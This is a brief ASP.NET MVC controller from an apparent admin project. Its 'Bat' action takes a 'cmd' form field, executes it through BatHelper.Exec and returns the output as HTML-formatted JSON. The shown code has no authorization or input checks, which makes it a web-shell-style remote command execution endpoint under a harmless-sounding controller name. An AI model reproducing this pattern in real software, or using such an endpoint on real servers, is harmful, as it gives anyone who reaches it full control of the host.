using Bc.Common.Helpers;
using Google.Protobuf.WellKnownTypes;
using Microsoft.AspNetCore.Mvc;
using System.Text.RegularExpressions;

namespace Bc.Admin.Controllers
{
    public class TransController : Controller
    {
        public IActionResult Trans()
        {
            return View();
        }

        [HttpPost]
        public IActionResult Bat()
        {
            var cmd = Request.Form["cmd"].ToStr();

            var r = BatHelper.Exec(cmd);
            Regex reg = new Regex("\r\n");
            r = reg.Replace(r, "<br/>");

            return Json(JsonHelper.JsonObject(true, r));


        }
    }
}
